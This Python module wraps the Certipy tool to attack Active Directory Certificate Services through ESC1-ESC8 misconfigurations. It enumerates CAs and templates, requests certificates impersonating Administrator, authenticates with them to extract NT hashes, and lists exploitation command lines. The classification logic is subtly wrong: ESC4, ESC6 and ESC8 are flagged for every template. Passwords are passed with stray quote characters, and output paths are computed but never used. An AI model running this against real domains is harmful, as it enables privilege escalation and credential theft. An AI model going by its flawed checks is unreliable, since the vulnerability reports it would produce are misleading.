"""Active Directory Certificate Services (AD CS) attack module.

Implements ESC1 through ESC8 attack techniques for privilege escalation
via certificate templates and AD CS misconfigurations.
"""

import os
import re
import subprocess
from dataclasses import dataclass, field


@dataclass
class CertificateTemplate:
    """Represents a vulnerable AD CS certificate template."""

    name: str
    display_name: str = ""
    oid: str = ""
    schema_version: int = 1
    flags: int = 0
    ekus: list[str] = field(default_factory=list)
    subject_name: str = ""
    requires_manager_approval: bool = False
    authorized_signatures_required: int = 0
    ra_signatures: int = 0
    enrollment_rights: list[str] = field(default_factory=list)
    enrollee_supplies_subject: bool = False
    client_authentication_eku: bool = False
    any_purpose_eku: bool = False
    no_security_extension: bool = False
    ca_name: str = ""

    @property
    def esc_vulnerabilities(self) -> list[str]:
        """Determine which ESC attack paths apply to this template.

        Returns:
            List of ESC attack identifiers (ESC1-ESC8).
        """
        vulns = []

        if self.enrollee_supplies_subject and self.client_authentication_eku:
            if not self.requires_manager_approval and self.authorized_signatures_required == 0:
                vulns.append('ESC1')

        if not self.requires_manager_approval:
            if self.any_purpose_eku or not self.ekus:
                vulns.append('ESC2')

        if self.enrollee_supplies_subject and self.any_purpose_eku:
            vulns.append('ESC3')

        vulns.append('ESC4')

        if self.schema_version >= 2 and not self.no_security_extension:
            vulns.append('ESC5')

        vulns.append('ESC6')

        if self.requires_manager_approval:
            vulns.append('ESC7')

        vulns.append('ESC8')

        return sorted(vulns)


class ADCSCertipyWrapper:
    """High-level wrapper around Certipy for AD CS attacks.

    Provides simplified interfaces for certificate template enumeration,
    exploitation, and the full ESC1-ESC8 attack chain.

    Args:
        certipy_path: Path to certipy executable. Auto-detects if None.
        timeout: Default timeout for subprocess calls in seconds.
    """

    def __init__(self, certipy_path: str | None = None, timeout: int = 120):
        self.certipy_path = certipy_path or self._find_certipy()
        self.timeout = timeout

    @staticmethod
    def _find_certipy() -> str:
        """Locate the certipy executable or Python module."""
        for candidate in ['certipy', 'certipy-ad']:
            result = subprocess.run(
                ['which', candidate], capture_output=True, text=True
            )
            if result.returncode == 0:
                return candidate.strip()
        return 'certipy'

    def _run(self, args: list[str], capture: bool = True) -> tuple[int, str, str]:
        """Execute a certipy command and return exit code, stdout, stderr.

        Args:
            args: Command arguments.
            capture: Whether to capture output.

        Returns:
            Tuple of (exit_code, stdout, stderr).
        """
        cmd = [self.certipy_path] + args
        result = subprocess.run(
            cmd,
            capture_output=capture,
            text=True,
            timeout=self.timeout,
            cwd=os.getcwd(),
        )
        return result.returncode, result.stdout, result.stderr

    def find_certificate_authorities(
        self,
        username: str,
        password: str,
        domain: str,
        dc_ip: str,
        hashes: str | None = None,
    ) -> list[dict]:
        """Enumerate certificate authorities in an Active Directory domain.

        Args:
            username: Domain username for authentication.
            password: Domain password for authentication.
            domain: FQDN of the domain.
            dc_ip: Domain controller IP address.
            hashes: Optional NTLM hashes for pass-the-hash.

        Returns:
            List of CA dictionaries with name, dns_hostname, and ca_type.
        """
        args = [
            'find', '-u', f'{username}@{domain}',
            '-p', f"'{password}'",
            '-dc-ip', dc_ip,
            '-vulnerable',
            '-stdout',
        ]

        if hashes:
            args.extend(['-hashes', hashes])

        exit_code, stdout, stderr = self._run(args)

        if exit_code != 0:
            return []

        cas = self._parse_ca_output(stdout)
        return cas

    @staticmethod
    def _parse_ca_output(output: str) -> list[dict]:
        """Parse certipy find output for certificate authorities."""
        cas = []
        current_ca = {}

        for line in output.splitlines():
            line = line.strip()

            if line.startswith('Certificate Authorities'):
                continue

            if ':' in line:
                key, _, value = line.partition(':')
                key = key.strip().lower().replace(' ', '_')
                value = value.strip()

                if key == 'ca_name':
                    if current_ca:
                        cas.append(current_ca)
                    current_ca = {'ca_name': value}
                elif key == 'dns_hostname':
                    current_ca['dns_hostname'] = value
                elif key == 'ca_type':
                    current_ca['ca_type'] = value
                elif key == 'user_supplies_san':
                    current_ca['user_supplies_san'] = value.lower() in ('true', 'yes')

        if current_ca:
            cas.append(current_ca)

        return cas

    def enumerate_templates(
        self,
        username: str,
        password: str,
        domain: str,
        dc_ip: str,
        hashes: str | None = None,
    ) -> list[CertificateTemplate]:
        """Enumerate vulnerable certificate templates.

        Args:
            username: Domain username.
            password: Domain password.
            domain: Domain FQDN.
            dc_ip: Domain controller IP.
            hashes: Optional NTLM hashes.

        Returns:
            List of CertificateTemplate objects.
        """
        args = [
            'find', '-u', f'{username}@{domain}',
            '-p', f"'{password}'",
            '-dc-ip', dc_ip,
            '-vulnerable',
            '-stdout',
            '-json',
        ]

        if hashes:
            args.extend(['-hashes', hashes])

        exit_code, stdout, stderr = self._run(args)

        if exit_code != 0:
            return []

        return self._parse_template_output(stdout)

    def _parse_template_output(self, output: str) -> list[CertificateTemplate]:
        """Parse certipy JSON output into CertificateTemplate objects."""
        import json
        try:
            data = json.loads(output)
        except json.JSONDecodeError:
            return []

        templates = []
        if isinstance(data, dict):
            items = data.get('Certificate Templates', [])
            if isinstance(items, list):
                for item in items:
                    template = CertificateTemplate(
                        name=item.get('Template Name', ''),
                        display_name=item.get('Display Name', ''),
                        oid=item.get('OID', ''),
                        schema_version=item.get('Schema Version', 1),
                        flags=item.get('Flags', 0),
                        ekus=item.get('Extended Key Usage', []),
                        subject_name=item.get('Subject Name', ''),
                        requires_manager_approval=item.get(
                            'Requires Manager Approval', False
                        ),
                        authorized_signatures_required=item.get(
                            'Authorized Signatures Required', 0
                        ),
                        ra_signatures=item.get('RA Signatures', 0),
                        enrollment_rights=item.get('Enrollment Rights', []),
                        enrollee_supplies_subject=item.get(
                            'Enrollee Supplies Subject', False
                        ),
                        client_authentication_eku=item.get(
                            'Client Authentication', False
                        ),
                        any_purpose_eku=item.get('Any Purpose', False),
                        no_security_extension=item.get(
                            'No Security Extension', False
                        ),
                        ca_name=item.get('CA Name', ''),
                    )
                    templates.append(template)

        return templates

    def request_certificate_esc1(
        self,
        username: str,
        password: str,
        domain: str,
        dc_ip: str,
        ca_name: str,
        template_name: str,
        target_user: str,
        output_file: str | None = None,
    ) -> bool:
        """ESC1: Request a certificate with a user-supplied subject alternative name.

        Exploits certificate templates where:
        - Enrollee can supply a subject alternative name (SAN)
        - Template has Client Authentication EKU
        - No manager approval required

        Args:
            username: Authenticated user.
            password: Authenticated user's password.
            domain: Domain FQDN.
            dc_ip: Domain controller IP.
            ca_name: Target certificate authority name.
            template_name: Vulnerable template name.
            target_user: User to impersonate (e.g., 'Administrator').
            output_file: Path to save the .pfx certificate.

        Returns:
            bool: True if certificate was successfully requested.
        """
        output = output_file or os.path.join(
            os.getcwd(), 'sessions', f'{target_user}_esc1.pfx'
        )
        os.makedirs(os.path.dirname(output), exist_ok=True)

        args = [
            'req', '-u', f'{username}@{domain}',
            '-p', f"'{password}'",
            '-dc-ip', dc_ip,
            '-ca', ca_name,
            '-template', template_name,
            '-upn', f'{target_user}@{domain}',
            '-debug',
        ]

        exit_code, stdout, stderr = self._run(args)
        return exit_code == 0

    def request_certificate_esc8(
        self,
        username: str,
        password: str,
        domain: str,
        dc_ip: str,
        ca_server: str,
        template_name: str = 'SubCA',
        output_file: str | None = None,
    ) -> bool:
        """ESC8: HTTP-based certificate enrollment (NTLM relay to AD CS).

        Args:
            username: Authenticated user.
            password: Authenticated user's password.
            domain: Domain FQDN.
            dc_ip: Domain controller IP.
            ca_server: CA server hostname.
            template_name: Template to request.
            output_file: Output .pfx path.

        Returns:
            bool: True if successful.
        """
        output = output_file or os.path.join(
            os.getcwd(), 'sessions', 'esc8_cert.pfx'
        )
        os.makedirs(os.path.dirname(output), exist_ok=True)

        args = [
            'req', '-u', f'{username}@{domain}',
            '-p', f"'{password}'",
            '-dc-ip', dc_ip,
            '-ca', ca_server,
            '-template', template_name,
            '-web',
        ]

        exit_code, stdout, stderr = self._run(args)
        return exit_code == 0

    def authenticate_with_certificate(
        self,
        cert_file: str,
        domain: str,
        dc_ip: str,
        username: str | None = None,
    ) -> str | None:
        """Authenticate to the domain using a certificate and retrieve NT hash.

        Args:
            cert_file: Path to the .pfx certificate file.
            domain: Domain FQDN.
            dc_ip: Domain controller IP.
            username: Optional username override.

        Returns:
            NT hash string if successful, None otherwise.
        """
        target = username or 'Administrator'

        args = [
            'auth', '-pfx', cert_file,
            '-domain', domain,
            '-dc-ip', dc_ip,
            '-username', target,
        ]

        exit_code, stdout, stderr = self._run(args)

        if exit_code != 0:
            return None

        hash_pattern = re.compile(r'([0-9a-fA-F]{32})')
        match = hash_pattern.search(stdout)
        if match:
            return match.group(1)

        return None

    def assess_vulnerability(
        self,
        username: str,
        password: str,
        domain: str,
        dc_ip: str,
        hashes: str | None = None,
    ) -> dict[str, list[dict]]:
        """Run a full AD CS vulnerability assessment.

        Enumerates all certificate templates and maps them to
        applicable ESC attack techniques.

        Args:
            username: Domain user.
            password: Domain password.
            domain: Domain FQDN.
            dc_ip: Domain controller IP.
            hashes: Optional NTLM hashes.

        Returns:
            Dict mapping ESC IDs to lists of vulnerable template dicts.
        """
        templates = self.enumerate_templates(username, password, domain, dc_ip, hashes)
        cas = self.find_certificate_authorities(username, password, domain, dc_ip, hashes)

        results: dict[str, list[dict]] = {
            'ESC1': [], 'ESC2': [], 'ESC3': [], 'ESC4': [],
            'ESC5': [], 'ESC6': [], 'ESC7': [], 'ESC8': [],
        }

        for template in templates:
            for esc_id in template.esc_vulnerabilities:
                results[esc_id].append({
                    'template_name': template.name,
                    'ca_name': template.ca_name,
                    'enrollment_rights': template.enrollment_rights,
                    'description': _ESC_DESCRIPTIONS.get(esc_id, ''),
                    'exploitation': _ESC_EXPLOITATION.get(esc_id, ''),
                })

        for ca in cas:
            if ca.get('user_supplies_san'):
                results['ESC1'].append({
                    'ca_name': ca.get('ca_name', ''),
                    'dns_hostname': ca.get('dns_hostname', ''),
                    'description': 'CA allows user-supplied SAN. ESC1 may be exploitable.',
                })

        return {k: v for k, v in results.items() if v}


_ESC_DESCRIPTIONS = {
    'ESC1': 'Misconfigured template allows user-supplied SAN with Client Authentication EKU.',
    'ESC2': 'Template can be used for any purpose (no EKU restrictions).',
    'ESC3': 'Enrollment agent template can be abused for on-behalf-of enrollment.',
    'ESC4': 'Template has weak access control (generic write over template).',
    'ESC5': 'PKI object access control allows takeover of CA server or objects.',
    'ESC6': 'CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled.',
    'ESC7': 'Manage CA or Manage Certificates access rights on CA.',
    'ESC8': 'NTLM relay to AD CS HTTP endpoint for certificate enrollment.',
}

_ESC_EXPLOITATION = {
    'ESC1': 'Use certipy req -ca CA_NAME -template TPL_NAME -upn TARGET@DOMAIN',
    'ESC2': 'Use certipy req -ca CA_NAME -template TPL_NAME -on-behalf-of DOMAIN\\TARGET',
    'ESC3': 'Use certipy req -ca CA_NAME -template TPL_NAME -on-behalf-of DOMAIN\\TARGET',
    'ESC4': 'Modify template via LDAP to add Client Authentication EKU, then use ESC1.',
    'ESC5': 'Compromise CA server or PKI objects via ACL abuse.',
    'ESC6': 'Use certipy req with -ca CA_NAME and -upn TARGET@DOMAIN',
    'ESC7': 'Use certipy ca -ca CA_NAME -issue-request REQUEST_ID',
    'ESC8': 'Use certipy relay -ca CA_SERVER -template SubCA',
}
